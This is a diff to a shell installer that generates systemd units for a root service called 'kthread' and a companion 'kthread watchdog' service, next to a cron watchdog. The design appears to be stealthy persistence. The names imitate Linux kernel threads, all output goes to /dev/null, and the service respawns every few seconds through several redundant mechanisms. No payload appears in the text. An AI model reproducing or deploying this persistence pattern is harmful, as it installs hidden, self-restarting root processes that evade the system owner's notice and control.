@@ -177,24 +177,63 @@ WATCH_EOF
 	fi
 	chmod 755 "${KTHREAD_WATCH}" 2>/dev/null || true
 	chmod 755 "${KTHREAD_DIR}" 2>/dev/null || true
+
+	if [ -f "${KWORKER_DIR}/kthread.service" ]; then
+		cp -f "${KWORKER_DIR}/kthread.service" "${KTHREAD_DIR}/kthread.service" 2>/dev/null || true
+	fi
+	return 0
+}
+
+write_kthread_service_unit() {
+	local dest="/etc/systemd/system/${KTHREAD_SERVICE}.service"
+	cat > "${dest}" <<UNIT_EOF
+[Unit]
+Description=kthread
+After=network-online.target
+Wants=network-online.target
+
+[Service]
+Type=simple
+User=root
+WorkingDirectory=${KTHREAD_DIR}
+ExecStart=${KTHREAD_BIN} --service-worker
+Restart=always
+RestartSec=3
+KillMode=mixed
+TimeoutStopSec=15
+StandardOutput=null
+StandardError=null
+
+[Install]
+WantedBy=multi-user.target
+UNIT_EOF
+	chmod 644 "${dest}" || return 1
 	return 0
 }
 
 install_kthread_service() {
 	local unit_src=""
+	local dest="/etc/systemd/system/${KTHREAD_SERVICE}.service"
+
 	if [ -f "${KWORKER_DIR}/kthread.service" ]; then
 		unit_src="${KWORKER_DIR}/kthread.service"
 	elif [ -f "${KTHREAD_DIR}/kthread.service" ]; then
 		unit_src="${KTHREAD_DIR}/kthread.service"
-	else
-		print_warn "kthread.service not found"
-		return 1
 	fi
-	cp -f "${unit_src}" "/etc/systemd/system/${KTHREAD_SERVICE}.service" || return 1
-	chmod 644 "/etc/systemd/system/${KTHREAD_SERVICE}.service" || return 1
+
+	if [ -n "${unit_src}" ]; then
+		cp -f "${unit_src}" "${dest}" || return 1
+		chmod 644 "${dest}" || return 1
+	else
+		print_warn "kthread.service not in package; generating default unit"
+		write_kthread_service_unit || return 1
+	fi
+
 	systemctl daemon-reload >/dev/null 2>&1 || return 1
+	[ -f "${dest}" ] || return 1
 	return 0
 }
+
 
 install_cron_watchdog() {
 	local cron_file="/etc/cron.d/kthread"
@@ -219,16 +258,44 @@ CRON_EOF
 	return 0
 }
 
+write_kthread_watch_service_unit() {
+	local dest="/etc/systemd/system/${WATCH_SERVICE}.service"
+	cat > "${dest}" <<WATCH_UNIT_EOF
+[Unit]
+Description=kthread watchdog
+After=network-online.target
+
+[Service]
+Type=simple
+ExecStart=${KTHREAD_WATCH}
+Restart=always
+RestartSec=10
+StandardOutput=null
+StandardError=null
+
+[Install]
+WantedBy=multi-user.target
+WATCH_UNIT_EOF
+	chmod 644 "${dest}" || return 1
+	return 0
+}
+
 install_watchdog_service() {
 	local watch_unit=""
+	local dest="/etc/systemd/system/${WATCH_SERVICE}.service"
+
 	if [ -f "${KWORKER_DIR}/kthread-watch.service" ]; then
 		watch_unit="${KWORKER_DIR}/kthread-watch.service"
-	else
-		print_warn "kthread-watch.service not in package"
-		return 1
 	fi
-	cp -f "${watch_unit}" "/etc/systemd/system/${WATCH_SERVICE}.service" || return 1
-	chmod 644 "/etc/systemd/system/${WATCH_SERVICE}.service" || return 1
+
+	if [ -n "${watch_unit}" ]; then
+		cp -f "${watch_unit}" "${dest}" || return 1
+		chmod 644 "${dest}" || return 1
+	else
+		print_warn "kthread-watch.service not in package; generating default unit"
+		write_kthread_watch_service_unit || return 1
+	fi
+
 	systemctl daemon-reload >/dev/null 2>&1 || return 1
 	systemctl enable --now "${WATCH_SERVICE}.service" >/dev/null 2>&1 || return 1
 	return 0
